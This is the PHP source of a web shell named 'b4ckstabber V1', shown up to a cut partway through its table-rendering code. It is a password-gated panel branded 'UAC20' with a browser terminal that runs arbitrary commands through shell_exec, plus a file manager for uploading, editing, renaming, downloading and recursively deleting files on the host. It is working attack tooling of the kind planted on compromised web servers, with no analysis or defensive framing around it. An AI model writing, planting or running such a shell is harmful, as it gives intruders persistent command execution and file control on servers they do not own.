<?php
// b4ckstabber V1 WEBSHELL
// AUTHOR : MatrixTM26
// GitHub : https://github.com/MatrixTM26

define("PASSWORD_HASH", "bc04b13eeb0a6c2f1303ca0e36263fd3");
define("SESSION_KEY", "fm_auth");
define("ROOT_DIR", __DIR__);
define("MAX_UPLOAD_MB", 20);

session_start();

if (isset($_POST["logout"])) {
  $_SESSION[SESSION_KEY] = false;
  header("Location: " . $_SERVER["PHP_SELF"]);
  exit();
}

if (isset($_POST["password"])) {
  $_SESSION[SESSION_KEY] = md5($_POST["password"]) === PASSWORD_HASH;
  if (!$_SESSION[SESSION_KEY]) {
    $loginError = "Incorrect password. Please try again.";
  }
}

$isAuthenticated = !empty($_SESSION[SESSION_KEY]);

function safePath(string $path): string|false
{
  $real = realpath($path);
  if ($real === false) {
    $parent = realpath(dirname($path));
    if ($parent === false || strpos($parent, ROOT_DIR) !== 0) {
      return false;
    }
    return $parent . DIRECTORY_SEPARATOR . basename($path);
  }
  if (strpos($real, ROOT_DIR) !== 0) {
    return false;
  }
  return $real;
}

function resolveParam(string $param): string|false
{
  return safePath(ROOT_DIR . DIRECTORY_SEPARATOR . ltrim($param, "/\\"));
}

function formatBytes(int $bytes): string
{
  if ($bytes >= 1073741824) {
    return round($bytes / 1073741824, 2) . " GB";
  }
  if ($bytes >= 1048576) {
    return round($bytes / 1048576, 2) . " MB";
  }
  if ($bytes >= 1024) {
    return round($bytes / 1024, 2) . " KB";
  }
  return $bytes . " B";
}

function relativePath(string $abs): string
{
  $rel = str_replace(ROOT_DIR, "", $abs);
  return "/" . ltrim(str_replace("\\", "/", $rel), "/");
}

function fileCategory(string $path): string
{
  $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
  $map = [
    "image" => ["jpg", "jpeg", "png", "gif", "webp", "svg", "ico", "bmp"],
    "code" => [
      "php",
      "js",
      "ts",
      "jsx",
      "tsx",
      "css",
      "html",
      "htm",
      "json",
      "xml",
      "yaml",
      "yml",
      "sh",
      "py",
      "rb",
      "go",
      "rs",
      "java",
      "c",
      "cpp",
      "h",
    ],
    "text" => ["txt", "md", "log", "csv", "ini", "env", "conf"],
    "archive" => ["zip", "tar", "gz", "bz2", "rar", "7z"],
    "video" => ["mp4", "mkv", "avi", "mov", "webm"],
    "audio" => ["mp3", "wav", "ogg", "flac", "aac"],
    "pdf" => ["pdf"],
  ];
  foreach ($map as $cat => $exts) {
    if (in_array($ext, $exts, true)) {
      return $cat;
    }
  }
  return "other";
}

function isTextEditable(string $path): bool
{
  return in_array(fileCategory($path), ["code", "text"], true);
}

if ($isAuthenticated && isset($_POST["term_cmd"])) {
  header("Content-Type: application/json");

  $cmd = trim($_POST["term_cmd"] ?? "");
  $cwd = $_POST["term_cwd"] ?? ROOT_DIR;
  if (!is_dir($cwd) || strpos(realpath($cwd), ROOT_DIR) !== 0) {
    $cwd = ROOT_DIR;
  }

  if ($cmd === "") {
    echo json_encode(["output" => "", "cwd" => $cwd, "isError" => false]);
    exit();
  }

  if ($cmd === "clear") {
    echo json_encode([
      "output" => "__CLEAR__",
      "cwd" => $cwd,
      "isError" => false,
    ]);
    exit();
  }

  $disabled = array_map("trim", explode(",", ini_get("disable_functions")));
  $canExec =
    !in_array("shell_exec", $disabled) && function_exists("shell_exec");

  if (!$canExec) {
    echo json_encode([
      "output" => "shell_exec is disabled on this server.",
      "cwd" => $cwd,
      "isError" => true,
    ]);
    exit();
  }

  $fullCmd =
    "cd " . escapeshellarg($cwd) . " && " . $cmd . ' 2>&1; echo "__EXIT__$?"';
  $raw = shell_exec($fullCmd);

  $exitCode = 0;
  $output = $raw;

  if (preg_match('/^(.*?)__EXIT__(\d+)\s*$/s', $raw, $m)) {
    $output = $m[1];
    $exitCode = (int) $m[2];
  }

  $output = rtrim($output);

  $newCwd = $cwd;
  if (preg_match('/^cd\s+(.+)$/i', trim($cmd), $cdm) || $cmd === "cd") {
    $cdDir = $cmd === "cd" ? ROOT_DIR : trim($cdm[1]);
    $cdDir = $cdDir[0] === "/" ? $cdDir : $cwd . "/" . $cdDir;
    $cdReal = realpath($cdDir);
    if ($cdReal && is_dir($cdReal) && strpos($cdReal, ROOT_DIR) === 0) {
      $newCwd = $cdReal;
    }
  }

  echo json_encode([
    "output" => $output,
    "cwd" => $newCwd,
    "isError" => $exitCode !== 0,
  ]);
  exit();
}

$message = "";
$messageType = "success";

if ($isAuthenticated) {
  $action = $_POST["action"] ?? ($_GET["action"] ?? "");

  if ($action === "delete") {
    $target = resolveParam($_POST["path"] ?? "");
    if (!$target) {
      $message = "Invalid path.";
      $messageType = "error";
    } elseif (is_dir($target)) {
      $it = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($target, FilesystemIterator::SKIP_DOTS),
        RecursiveIteratorIterator::CHILD_FIRST
      );
      foreach ($it as $entry) {
        $entry->isDir()
          ? rmdir($entry->getRealPath())
          : unlink($entry->getRealPath());
      }
      rmdir($target);
      $message = "Directory deleted successfully.";
    } elseif (is_file($target)) {
      unlink($target);
      $message = "File deleted successfully.";
    } else {
      $message = "Target not found.";
      $messageType = "error";
    }
  }

  if ($action === "create_file") {
    $dir = resolveParam($_POST["dir"] ?? "");
    $name = basename($_POST["name"] ?? "");
    if (!$dir || !$name) {
      $message = "Invalid directory or filename.";
      $messageType = "error";
    } else {
      $newPath = $dir . DIRECTORY_SEPARATOR . $name;
      if (file_exists($newPath)) {
        $message = "A file with that name already exists.";
        $messageType = "error";
      } else {
        file_put_contents($newPath, "");
        $message = "File '{$name}' created.";
      }
    }
  }

  if ($action === "create_dir") {
    $dir = resolveParam($_POST["dir"] ?? "");
    $name = basename($_POST["name"] ?? "");
    if (!$dir || !$name) {
      $message = "Invalid path or directory name.";
      $messageType = "error";
    } else {
      $newPath = $dir . DIRECTORY_SEPARATOR . $name;
      if (file_exists($newPath)) {
        $message = "A directory with that name already exists.";
        $messageType = "error";
      } else {
        mkdir($newPath, 0755, true);
        $message = "Directory '{$name}' created.";
      }
    }
  }

  if ($action === "save_file") {
    $target = resolveParam($_POST["path"] ?? "");
    $content = $_POST["content"] ?? "";
    if (!$target || !is_file($target)) {
      $message = "Invalid file path.";
      $messageType = "error";
    } else {
      file_put_contents($target, $content);
      $message = "File saved successfully.";
    }
  }

  if ($action === "rename") {
    $target = resolveParam($_POST["path"] ?? "");
    $newName = basename($_POST["new_name"] ?? "");
    if (!$target || !$newName) {
      $message = "Invalid path or name.";
      $messageType = "error";
    } else {
      $dest = dirname($target) . DIRECTORY_SEPARATOR . $newName;
      rename($target, $dest);
      $message = "Renamed to '{$newName}'.";
    }
  }

  if ($action === "upload" && isset($_FILES["upload_file"])) {
    $dir = resolveParam($_POST["dir"] ?? "");
    $file = $_FILES["upload_file"];
    if (!$dir) {
      $message = "Invalid upload directory.";
      $messageType = "error";
    } elseif ($file["error"] !== UPLOAD_ERR_OK) {
      $message = "Upload failed.";
      $messageType = "error";
    } elseif ($file["size"] > MAX_UPLOAD_MB * 1048576) {
      $message = "File exceeds " . MAX_UPLOAD_MB . " MB limit.";
      $messageType = "error";
    } else {
      $dest = $dir . DIRECTORY_SEPARATOR . basename($file["name"]);
      move_uploaded_file($file["tmp_name"], $dest);
      $message = "'{$file["name"]}' uploaded successfully.";
    }
  }

  if ($action === "download") {
    $target = resolveParam($_GET["path"] ?? "");
    if ($target && is_file($target)) {
      header("Content-Type: application/octet-stream");
      header(
        'Content-Disposition: attachment; filename="' . basename($target) . '"'
      );
      header("Content-Length: " . filesize($target));
      readfile($target);
      exit();
    }
  }
}

$currentDirParam = $_GET["dir"] ?? "";
$currentDir = $isAuthenticated
  ? (resolveParam($currentDirParam) ?:
  ROOT_DIR)
  : ROOT_DIR;
if (!is_dir($currentDir)) {
  $currentDir = ROOT_DIR;
}

$editFilePath = "";
$editFileContent = "";

if ($isAuthenticated && isset($_GET["edit"])) {
  $ep = resolveParam($_GET["edit"]);
  if ($ep && is_file($ep) && isTextEditable($ep)) {
    $editFilePath = $ep;
    $editFileContent = file_get_contents($ep);
  }
}

$dirs = [];
$files = [];

if ($isAuthenticated) {
  foreach (new DirectoryIterator($currentDir) as $item) {
    if ($item->isDot()) {
      continue;
    }
    $info = [
      "name" => $item->getFilename(),
      "path" => relativePath($item->getRealPath()),
      "abs" => $item->getRealPath(),
      "size" => $item->isFile() ? $item->getSize() : 0,
      "mtime" => $item->getMTime(),
      "writable" => is_writable($item->getRealPath()),
      "category" => $item->isFile()
        ? fileCategory($item->getRealPath())
        : "dir",
    ];
    $item->isDir() ? ($dirs[] = $info) : ($files[] = $info);
  }
  usort($dirs, fn($a, $b) => strcmp($a["name"], $b["name"]));
  usort($files, fn($a, $b) => strcmp($a["name"], $b["name"]));
}

$breadcrumbs = [["label" => "Root", "path" => "/"]];
$relCurrent = relativePath($currentDir);
$accum = "";
foreach (array_filter(explode("/", trim($relCurrent, "/"))) as $seg) {
  $accum .= "/" . $seg;
  $breadcrumbs[] = ["label" => $seg, "path" => $accum];
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>UAC20 Webshell Panel</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
:root {
    --black:    #0a0a0a;
    --black2:   #111111;
    --black3:   #1a1a1a;
    --black4:   #222222;
    --black5:   #2d2d2d;
    --red:      #cc0000;
    --red2:     #e60000;
    --red3:     #ff3333;
    --red-dim:  rgba(204,0,0,.14);
    --red-dim2: rgba(204,0,0,.07);
    --white:    #ffffff;
    --white2:   #f0f0f0;
    --white3:   #c8c8c8;
    --white4:   #888888;
    --white5:   #555555;
    --border:   #2a2a2a;
    --border2:  #3a3a3a;
    --r:        8px;
    --rl:       12px;
    --shadow:   0 8px 32px rgba(0,0,0,.6);
    --t:        .15s ease;
}

*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
html { font-size: 15px; }
body { font-family: 'Inter', sans-serif; background: var(--black); color: var(--white2); min-height: 100vh; line-height: 1.6; }

::-webkit-scrollbar { width: 5px; height: 5px; }
::-webkit-scrollbar-track { background: var(--black2); }
::-webkit-scrollbar-thumb { background: var(--black5); border-radius: 99px; }
::-webkit-scrollbar-thumb:hover { background: var(--red); }

.mono { font-family: 'JetBrains Mono', monospace; }

.login-wrap {
    display: flex; align-items: center; justify-content: center;
    min-height: 100vh; padding: 1.5rem;
    background: radial-gradient(ellipse 55% 45% at 20% 30%, rgba(204,0,0,.12) 0%, transparent 65%),
                radial-gradient(ellipse 40% 35% at 85% 75%, rgba(204,0,0,.07) 0%, transparent 60%),
                var(--black);
}

.login-card {
    width: 100%; max-width: 420px;
    background: var(--black2);
    border: 1px solid var(--border2); border-top: 2px solid var(--red);
    border-radius: var(--rl); padding: 2.5rem 2rem; box-shadow: var(--shadow);
}

.login-logo { display: flex; align-items: center; gap: .65rem; font-size: 1.5rem; font-weight: 800; letter-spacing: -.03em; color: var(--white); margin-bottom: .5rem; }
.login-logo i { color: var(--red); font-size: 1.3rem; }
.login-sub { font-size: .82rem; color: var(--white4); margin-bottom: 2rem; padding-bottom: 1.5rem; border-bottom: 1px solid var(--border); }

.field-label { display: block; font-size: .72rem; font-weight: 700; letter-spacing: .08em; text-transform: uppercase; color: var(--white4); margin-bottom: .4rem; }
.field-group { margin-bottom: 1.25rem; }

input[type="password"], input[type="text"] {
    width: 100%; background: var(--black3); border: 1px solid var(--border2);
    border-radius: var(--r); padding: .7rem 1rem; color: var(--white);
    font-family: 'Inter', sans-serif; font-size: .92rem; outline: none;
    transition: border-color var(--t), box-shadow var(--t);
}
input:focus { border-color: var(--red); box-shadow: 0 0 0 3px rgba(204,0,0,.2); }

.btn {
    display: inline-flex; align-items: center; gap: .45rem;
    padding: .55rem 1.1rem; border-radius: var(--r);
    font-family: 'Inter', sans-serif; font-size: .83rem; font-weight: 600;
    cursor: pointer; border: none;
    transition: opacity var(--t), transform var(--t), background var(--t);
    white-space: nowrap; text-decoration: none;
}
.btn:hover  { opacity: .85; transform: translateY(-1px); }
.btn:active { transform: translateY(0); opacity: 1; }

.btn-primary { background: var(--red); color: var(--white); box-shadow: 0 2px 12px rgba(204,0,0,.35); }
.btn-primary:hover { background: var(--red2); opacity: 1; }
.btn-ghost   { background: var(--black4); color: var(--white3); border: 1px solid var(--border2); }
.btn-ghost:hover { color: var(--white); border-color: var(--white5); opacity: 1; }
.btn-danger  { background: transparent; color: var(--red3); border: 1px solid rgba(204,0,0,.4); }
.btn-danger:hover { background: var(--red-dim); opacity: 1; }
.btn-outline { background: transparent; color: var(--white3); border: 1px solid var(--border2); }
.btn-outline:hover { border-color: var(--red); color: var(--red3); opacity: 1; }
.btn-sm   { padding: .32rem .7rem; font-size: .76rem; }
.btn-full { width: 100%; justify-content: center; }

.alert {
    display: flex; align-items: center; gap: .65rem;
    padding: .8rem 1.1rem; border-radius: var(--r);
    font-size: .87rem; font-weight: 500; margin-bottom: 1.25rem; border: 1px solid transparent;
}
.alert-success { background: rgba(255,255,255,.05); border-color: rgba(255,255,255,.1); color: var(--white2); }
.alert-error   { background: var(--red-dim); border-color: rgba(204,0,0,.3); color: var(--red3); }

.app-shell { display: grid; grid-template-rows: auto 1fr; min-height: 100vh; }

.topbar {
    display: flex; align-items: center; gap: 1rem;
    padding: .8rem 1.5rem; background: var(--black2);
    border-bottom: 1px solid var(--border);
    position: sticky; top: 0; z-index: 100; flex-wrap: wrap;
}
.topbar-logo { display: flex; align-items: center; gap: .55rem; font-size: 1.1rem; font-weight: 800; letter-spacing: -.02em; color: var(--white); flex-shrink: 0; }
.topbar-logo i { color: var(--red); }
.topbar-sep  { width: 1px; height: 1.4rem; background: var(--border2); flex-shrink: 0; }
.topbar-path { font-family: 'JetBrains Mono', monospace; font-size: .72rem; color: var(--white5); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 300px; }

.main { padding: 1.5rem; max-width: 1400px; width: 100%; margin: 0 auto; }

.breadcrumb {
    display: flex; align-items: center; gap: .3rem; flex-wrap: wrap;
    margin-bottom: 1.25rem; font-family: 'JetBrains Mono', monospace; font-size: .78rem;
    background: var(--black2); border: 1px solid var(--border); border-radius: var(--r); padding: .55rem .9rem;
}
.breadcrumb a { color: var(--red3); text-decoration: none; transition: color var(--t); }
.breadcrumb a:hover { color: var(--white); }
.breadcrumb .bc-sep { color: var(--white5); }
.breadcrumb .bc-cur { color: var(--white3); }

.toolbar { display: flex; align-items: center; gap: .5rem; flex-wrap: wrap; margin-bottom: 1.25rem; }
.divider  { width: 1px; background: var(--border); align-self: stretch; flex-shrink: 0; }

.stats-strip { display: flex; gap: .65rem; flex-wrap: wrap; margin-bottom: 1.25rem; }
.stat-chip {
    display: flex; align-items: center; gap: .45rem;
    background: var(--black2); border: 1px solid var(--border);
    border-radius: var(--r); padding: .4rem .85rem; font-size: .78rem; color: var(--white4);
}
.stat-chip i { color: var(--red); font-size: .8rem; }
.stat-chip strong { color: var(--white2); }

.file-table-wrap { background: var(--black2); border: 1px solid var(--border); border-radius: var(--rl); overflow: hidden; overflow-x: auto; }
.file-table { width: 100%; border-collapse: collapse; min-width: 600px; }
.file-table th { background: var(--black3); text-align: left; padding: .7rem 1rem; font-size: .7rem; font-weight: 700; letter-spacing: .09em; text-transform: uppercase; color: var(--white5); border-bottom: 1px solid var(--border); white-space: nowrap; }
.file-table td { padding: .6rem 1rem; font-size: .86rem; border-bottom: 1px solid var(--border); vertical-align: middle; }
.file-table tr:last-child td { border-bottom: none; }
.file-table tbody tr { transition: background var(--t); }
.file-table tbody tr:hover { background: var(--black3); }

.file-name-cell { display: flex; align-items: center; gap: .6rem; }
.file-icon { width: 30px; height: 30px; display: flex; align-items: center; justify-content: center; border-radius: 7px; font-size: .85rem; flex-shrink: 0; border: 1px solid transparent; }
.icon-dir     { background: rgba(255,255,255,.05); border-color: var(--border2); color: var(--white3); }
.icon-code    { background: var(--red-dim2); border-color: rgba(204,0,0,.2); color: var(--red3); }
.icon-image   { background: rgba(255,255,255,.04); border-color: var(--border); color: var(--white4); }
.icon-text    { background: rgba(255,255,255,.04); border-color: var(--border); color: var(--white4); }
.icon-archive { background: rgba(255,255,255,.04); border-color: var(--border); color: var(--white4); }
.icon-pdf     { background: var(--red-dim2); border-color: rgba(204,0,0,.2); color: var(--red3); }
.icon-other   { background: rgba(255,255,255,.03); border-color: var(--border); color: var(--white5); }

.file-link { color: var(--white2); text-decoration: none; font-weight: 500; transition: color var(--t); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 260px; display: block; }
.file-link:hover { color: var(--red3); }
.dir-link  { color: var(--white); font-weight: 600; }
.dir-link:hover { color: var(--red3); }

.cell-mono { font-family: 'JetBrains Mono', monospace; font-size: .75rem; color: var(--white5); white-space: nowrap; }

.perm-badge { display: inline-flex; align-items: center; gap: .3rem; padding: .15rem .5rem; border-radius: 4px; font-size: .69rem; font-weight: 700; font-family: 'JetBrains Mono', monospace; border: 1px solid transparent; }
.perm-write { background: rgba(255,255,255,.05); border-color: var(--border2); color: var(--white3); }
.perm-read  { background: var(--red-dim2); border-color: rgba(204,0,0,.2); color: var(--red3); }

.cat-tag { display: inline-block; padding: .12rem .5rem; border-radius: 4px; font-size: .68rem; font-weight: 700; letter-spacing: .05em; text-transform: uppercase; background: var(--black3); border: 1px solid var(--border2); color: var(--white4); white-space: nowrap; }
.cat-code { background: var(--red-dim2); border-color: rgba(204,0,0,.2); color: var(--red3); }
.cat-pdf  { background: var(--red-dim2); border-color: rgba(204,0,0,.2); color: var(--red3); }
.cat-dir  { background: rgba(255,255,255,.06); border-color: var(--border2); color: var(--white2); }

.action-group { display: flex; gap: .3rem; justify-content: flex-end; flex-wrap: wrap; }

.empty-state { text-align: center; padding: 4rem 2rem; color: var(--white5); }
.empty-state i { font-size: 2.5rem; color: var(--black5); margin-bottom: .75rem; display: block; }
.empty-state p { font-size: .88rem; }

.modal-overlay {
    position: fixed; inset: 0; background: rgba(0,0,0,.75); backdrop-filter: blur(4px);
    display: flex; align-items: center; justify-content: center;
    z-index: 200; padding: 1.25rem; opacity: 0; pointer-events: none; transition: opacity var(--t);
}
.modal-overlay.open { opacity: 1; pointer-events: all; }
.modal {
    background: var(--black2); border: 1px solid var(--border2); border-top: 2px solid var(--red);
    border-radius: var(--rl); padding: 1.75rem; width: 100%; max-width: 460px;
    box-shadow: var(--shadow); transform: translateY(16px) scale(.98); transition: transform var(--t);
}
.modal-overlay.open .modal { transform: translateY(0) scale(1); }
.modal-title { display: flex; align-items: center; gap: .6rem; font-size: 1rem; font-weight: 700; margin-bottom: 1.25rem; color: var(--white); }
.modal-title i { color: var(--red); }
.modal-footer { display: flex; justify-content: flex-end; gap: .5rem; margin-top: 1.25rem; }
.confirm-body { font-size: .9rem; color: var(--white3); line-height: 1.7; }
.confirm-body strong { color: var(--white); }
.warn-text { display: flex; align-items: flex-start; gap: .5rem; margin-top: .85rem; padding: .65rem .85rem; background: var(--red-dim); border: 1px solid rgba(204,0,0,.3); border-radius: var(--r); font-size: .8rem; color: var(--red3); }

.upload-zone { display: block; border: 2px dashed var(--border2); border-radius: var(--r); padding: 1.75rem 1rem; text-align: center; cursor: pointer; transition: border-color var(--t), background var(--t); font-size: .85rem; color: var(--white5); background: var(--black3); }
.upload-zone:hover { border-color: var(--red); background: var(--red-dim2); color: var(--white3); }
.upload-zone i { font-size: 1.75rem; color: var(--black5); margin-bottom: .5rem; display: block; transition: color var(--t); }
.upload-zone:hover i { color: var(--red); }

.editor-section { background: var(--black2); border: 1px solid var(--border); border-top: 2px solid var(--red); border-radius: var(--rl); overflow: hidden; margin-top: 1.5rem; }
.editor-header  { display: flex; align-items: center; gap: .75rem; padding: .75rem 1.1rem; background: var(--black3); border-bottom: 1px solid var(--border); flex-wrap: wrap; }
.editor-path    { font-family: 'JetBrains Mono', monospace; font-size: .75rem; color: var(--red3); background: var(--red-dim2); border: 1px solid rgba(204,0,0,.2); padding: .2rem .6rem; border-radius: 5px; word-break: break-all; }
textarea.code-editor { display: block; width: 100%; min-height: 420px; resize: vertical; background: var(--black); border: none; padding: 1.25rem 1.4rem; color: var(--white2); font-family: 'JetBrains Mono', monospace; font-size: .82rem; line-height: 1.75; tab-size: 4; outline: none; }
.editor-footer  { display: flex; gap: .5rem; justify-content: flex-end; padding: .75rem 1.1rem; background: var(--black3); border-top: 1px solid var(--border); flex-wrap: wrap; }


.terminal-section {
    margin-top: 1.5rem;
    background: var(--black);
    border: 1px solid var(--border);
    border-top: 2px solid var(--red);
    border-radius: var(--rl);
    overflow: hidden;
}

.terminal-header {
    display: flex; align-items: center; gap: .75rem;
    padding: .7rem 1.1rem;
    background: var(--black2); border-bottom: 1px solid var(--border);
    user-select: none;
}

.term-dot { width: 12px; height: 12px; border-radius: 50%; }
.term-dot-r { background: #cc3333; }
.term-dot-y { background: #cca000; }
.term-dot-g { background: #3a9a3a; }

.term-title { font-size: .82rem; font-weight: 700; color: var(--white3); margin-left: .25rem; }
.term-cwd   { font-family: 'JetBrains Mono', monospace; font-size: .72rem; color: var(--red3); background: var(--red-dim2); border: 1px solid rgba(204,0,0,.18); padding: .18rem .55rem; border-radius: 5px; }

.term-help-btn {
    margin-left: auto; background: transparent; border: 1px solid var(--border2);
    color: var(--white5); border-radius: 5px; padding: .2rem .65rem;
    font-size: .72rem; cursor: pointer; transition: color var(--t), border-color var(--t);
    font-family: 'Inter', sans-serif;
}
.term-help-btn:hover { color: var(--white2); border-color: var(--white5); }

.term-clear-btn {
    background: transparent; border: 1px solid var(--border2);
    color: var(--white5); border-radius: 5px; padding: .2rem .65rem;
    font-size: .72rem; cursor: pointer; transition: color var(--t), border-color var(--t);
    font-family: 'Inter', sans-serif;
}
.term-clear-btn:hover { color: var(--red3); border-color: var(--red); }

.term-output {
    font-family: 'JetBrains Mono', monospace;
    font-size: .8rem;
    line-height: 1.65;
    padding: 1rem 1.25rem;
    min-height: 220px;
    max-height: 420px;
    overflow-y: auto;
    background: var(--black);
    color: var(--white3);
    white-space: pre-wrap;
    word-break: break-all;
}

.term-line { margin-bottom: .1rem; }
.term-line.cmd-line span.term-prompt { color: var(--red); }
.term-line.cmd-line span.term-input  { color: var(--white); }
.term-line.out-line  { color: var(--white3); }
.term-line.err-line  { color: var(--red3); }
.term-line.info-line { color: var(--white5); font-style: italic; }

.term-input-row {
    display: flex;
    align-items: center;
    gap: .75rem;
    padding: .7rem 1.25rem;
    background: var(--black2);
    border-top: 1px solid var(--border);
}

.term-prompt-label {
    font-family: 'JetBrains Mono', monospace;
    font-size: .82rem;
    color: var(--red);
    flex-shrink: 0;
    white-space: nowrap;
}

.term-input-wrap {
    flex: 1;
    display: flex;
    align-items: center;
    background: var(--black3);
    border: 1px solid var(--border2);
    border-radius: var(--r);
    padding: .45rem .75rem;
    gap: .5rem;
    transition: border-color var(--t), box-shadow var(--t);
}

.term-input-wrap:focus-within {
    border-color: var(--red);
    box-shadow: 0 0 0 3px rgba(204,0,0,.15);
}

.term-input {
    flex: 1;
    background: transparent;
    border: none;
    outline: none;
    font-family: 'JetBrains Mono', monospace;
    font-size: .82rem;
    color: var(--white);
    caret-color: var(--red);
    min-width: 0;
}

.term-input::placeholder { color: var(--white5); }

.term-submit-btn {
    background: var(--red);
    border: none;
    color: #fff;
    border-radius: var(--r);
    padding: .5rem 1.1rem;
    font-size: .8rem;
    font-weight: 600;
    cursor: pointer;
    transition: background var(--t);
    flex-shrink: 0;
    font-family: 'Inter', sans-serif;
    display: flex;
    align-items: center;
    gap: .4rem;
}
.term-submit-btn:hover { background: var(--red2); }

.term-busy { opacity: .5; pointer-events: none; }

/* ── tab toggle ─────────────────────────────── */
.tab-bar { display: flex; gap: 0; margin-bottom: 1.5rem; background: var(--black2); border: 1px solid var(--border); border-radius: var(--r); overflow: hidden; }
.tab-btn {
    flex: 1; padding: .6rem 1rem; background: transparent; border: none; color: var(--white4);
    font-family: 'Inter', sans-serif; font-size: .82rem; font-weight: 600;
    cursor: pointer; transition: background var(--t), color var(--t);
    display: flex; align-items: center; justify-content: center; gap: .45rem;
}
.tab-btn:hover { background: var(--black3); color: var(--white2); }
.tab-btn.active { background: var(--red); color: var(--white); }
.tab-pane { display: none; }
.tab-pane.active { display: block; }

@media (max-width: 768px) {
    .main { padding: 1rem; }
    .topbar { padding: .7rem 1rem; gap: .6rem; }
    .topbar-sep, .topbar-path { display: none; }
    .col-size, .col-perm { display: none; }
    .file-link { max-width: 160px; }
    .action-group { gap: .25rem; }
}

@media (max-width: 480px) {
    .col-mtime { display: none; }
    .login-card { padding: 1.75rem 1.25rem; }
    .modal { padding: 1.25rem; }
    .stats-strip { gap: .4rem; }
    .stat-chip { padding: .35rem .65rem; font-size: .72rem; }
    .tab-btn { font-size: .75rem; padding: .55rem .6rem; }
    .term-output { font-size: .73rem; max-height: 300px; }
}
</style>
</head>
<body>

<?php if (!$isAuthenticated): ?>
<div class="login-wrap">
    <div class="login-card">
        <div class="login-logo">
            <i class="fa-solid fa-shield-halved"></i>
            UAC20
        </div>
        <p class="login-sub">Secure access required to continue.</p>

        <?php if (!empty($loginError)): ?>
            <div class="alert alert-error">
                <i class="fa-solid fa-circle-xmark"></i>
                <?= htmlspecialchars($loginError) ?>
            </div>
        <?php endif; ?>

        <form method="POST">
            <div class="field-group">
                <label class="field-label" for="pwd">Password</label>
                <input type="password" id="pwd" name="password" placeholder="Enter UAC20 password" autofocus>
            </div>
            <button type="submit" class="btn btn-primary btn-full">
                <i class="fa-solid fa-right-to-bracket"></i> Sign In
            </button>
        </form>
    </div>
</div>

<?php else: ?>
<div class="app-shell">

    <header class="topbar">
        <div class="topbar-logo">
            <i class="fa-solid fa-shield-halved"></i>
            UAC20
        </div>
        <div class="topbar-sep"></div>
        <span class="topbar-path mono"><?= htmlspecialchars(
          relativePath($currentDir)
        ) ?></span>
        <div style="margin-left:auto;display:flex;gap:.5rem;align-items:center;flex-wrap:wrap">
            <span class="cell-mono" style="color:var(--white5);font-size:.7rem">
                PHP <?= PHP_MAJOR_VERSION . "." . PHP_MINOR_VERSION ?>
            </span>
            <form method="POST" style="display:inline">
                <button name="logout" value="1" class="btn btn-ghost btn-sm">
                    <i class="fa-solid fa-arrow-right-from-bracket"></i> Sign Out
                </button>
            </form>
        </div>
    </header>

    <main class="main">

        <?php if ($message): ?>
            <div class="alert alert-<?= $messageType ?>">
                <i class="fa-solid fa-<?= $messageType === "success"
                  ? "circle-check"
                  : "circle-xmark" ?>"></i>
                <?= htmlspecialchars($message) ?>
            </div>
        <?php endif; ?>

        <nav class="breadcrumb">
            <i class="fa-solid fa-folder-tree" style="color:var(--red);margin-right:.2rem"></i>
            <?php foreach ($breadcrumbs as $i => $crumb): ?>
                <?php if (
                  $i > 0
                ): ?><span class="bc-sep">/</span><?php endif; ?>
                <?php if ($i === count($breadcrumbs) - 1): ?>
                    <span class="bc-cur"><?= htmlspecialchars(
                      $crumb["label"]
                    ) ?></span>
                <?php else: ?>
                    <a href="?dir=<?= urlencode(
                      $crumb["path"]
                    ) ?>"><?= htmlspecialchars($crumb["label"]) ?></a>
                <?php endif; ?>
            <?php endforeach; ?>
        </nav>

        <div class="tab-bar">
            <button class="tab-btn active" onclick="switchTab('files',this)">
                <i class="fa-solid fa-folder-open"></i> File Manager
            </button>
            <button class="tab-btn" onclick="switchTab('terminal',this)">
                <i class="fa-solid fa-terminal"></i> Terminal
            </button>
        </div>

        <div class="tab-pane active" id="tab-files">

            <div class="toolbar">
                <?php if ($currentDir !== ROOT_DIR): ?>
                    <a href="?dir=<?= urlencode(
                      relativePath(dirname($currentDir))
                    ) ?>" class="btn btn-ghost btn-sm">
                        <i class="fa-solid fa-arrow-left"></i> Up
                    </a>
                    <div class="divider"></div>
                <?php endif; ?>
                <button class="btn btn-primary btn-sm" onclick="openModal('modal-new-file')">
                    <i class="fa-solid fa-file-circle-plus"></i> New File
                </button>
                <button class="btn btn-outline btn-sm" onclick="openModal('modal-new-dir')">
                    <i class="fa-solid fa-folder-plus"></i> New Folder
                </button>
                <button class="btn btn-ghost btn-sm" onclick="openModal('modal-upload')">
                    <i class="fa-solid fa-upload"></i> Upload
                </button>
            </div>

            <div class="stats-strip">
                <div class="stat-chip">
                    <i class="fa-solid fa-folder"></i>
                    <span><strong><?= count($dirs) ?></strong> folders</span>
                </div>
                <div class="stat-chip">
                    <i class="fa-solid fa-file"></i>
                    <span><strong><?= count($files) ?></strong> files</span>
                </div>
                <div class="stat-chip">
                    <i class="fa-solid fa-database"></i>
                    <span><strong><?= formatBytes(
                      array_sum(array_column($files, "size"))
                    ) ?></strong></span>
                </div>
                <div class="stat-chip">
                    <i class="fa-solid fa-server"></i>
                    <span><strong><?= htmlspecialchars(
                      $_SERVER["SERVER_SOFTWARE"] ?? "Unknown"
                    ) ?></strong></span>
                </div>
            </div>

            <div class="file-table-wrap">
                <table class="file-table">
                    <thead>
                        <tr>
                            <th><i class="fa-solid fa-file fa-xs" style="margin-right:.4rem"></i>Name</th>
                            <th>Type</th>
                            <th class="col-size">Size</th>
                            <th class="col-mtime">Modified</th>
                            <th class="col-perm">Access</th>
                            <th style="text-align:right">Actions</th>
                        </tr>
                    </thead>
                    <tbody>
<?php
function renderRow(array $item, bool $isDir): void
{
  $cat = $isDir ? "dir" : $item["category"];
  $iconMap = [
    "dir" => ["fa-folder", "icon-dir"],
    "image" => ["fa-image", "icon-image"],
    "code" => ["fa-code", "icon-code"],
